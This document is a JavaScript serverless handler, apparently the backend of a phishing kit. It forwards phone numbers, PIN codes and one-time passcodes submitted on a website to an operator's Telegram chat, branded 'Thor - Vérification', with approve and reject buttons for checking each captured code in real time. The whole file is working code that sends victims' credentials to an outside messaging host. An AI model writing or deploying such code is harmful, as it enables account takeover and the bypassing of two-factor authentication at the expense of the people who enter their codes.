globalThis.verificationStore = globalThis.verificationStore || {};

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in Vercel settings." });
    }

    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // Handle Telegram Button clicks (Optional, but keeps the UI clean if you click them)
            if (body.callback_query) {
                const callback = body.callback_query;
                const [action, userId, type] = callback.data.split('_');
                
                let statusText = action === 'approve' 
                    ? `\n\n✅ <b>${type} APPROUVÉ</b>` 
                    : `\n\n❌ <b>${type} REJETÉ</b>`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: callback.message.text + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // Handle messages from the website
            if (body.action === 'send') {
                const { type, userId, data } = body;
                let message = "";
                let keyboard = null;
                const time = new Date().toLocaleString();

                const title = type === 'PHONE' ? 'NUMÉRO DE TÉLÉPHONE' : (type === 'PIN' ? 'CODE PIN' : 'CODE OTP');
                const length = type === 'PHONE' ? '9 chiffres' : '4 chiffres';
                
                message = `# Thor - Vérification ${type}\n`;
                message += `<b>VÉRIFICATION ${title}</b>\n\n`;
                message += `<b>DÉTAILS:</b>\n`;
                message += `• ${title}: <code>${data.phone || data.value}</code>\n`;
                message += `• Username: user_${userId}\n`;
                message += `• Heure: ${time}\n`;
                message += `• Bot: user75\n\n`;
                message += `<b>Vérifier:</b>\n`;
                message += `• Longueur: ${length}\n`;
                message += `• Délai: 5 minutes\n`;

                keyboard = {
                    inline_keyboard: [
                        [
                            { text: `✅ ${type} Correct`, callback_data: `approve_${userId}_${type}` },
                            { text: `❌ ${type} Incorrect`, callback_data: `reject_${userId}_${type}` }
                        ]
                    ]
                };

                const payload = {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                };

                const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!tgResponse.ok) {
                    const errData = await tgResponse.json();
                    return res.status(500).json({ error: "Telegram Error: " + errData.description });
                }

                return res.status(200).json({ success: true });
            }

        } catch (error) {
            console.error(error);
            return res.status(500).json({ error: error.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
}
